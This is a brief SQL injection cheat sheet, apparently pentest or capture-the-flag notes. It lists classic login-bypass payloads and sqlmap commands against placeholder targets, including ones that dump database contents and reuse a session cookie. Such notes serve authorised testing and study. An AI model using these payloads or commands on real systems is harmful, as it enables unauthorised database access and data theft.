# SQL Injection (SQLi)

## Manual Test Payloads
' OR 1=1--
" OR 1=1--
') OR '1'='1
admin' --

## SQLMap (basic)

sqlmap -u "http://<TARGET_IP>/index.php?id=1" --batch
SQLMap (dump data)

sqlmap -u "http://<TARGET_IP>/product.php?id=5" --batch --dump
SQLMap with Auth Cookies

sqlmap -u "http://<TARGET_IP>/dashboard?id=2" --cookie="PHPSESSID=abc123" --batch
Identify DB Type

sqlmap -u "<URL>?id=1" --banner
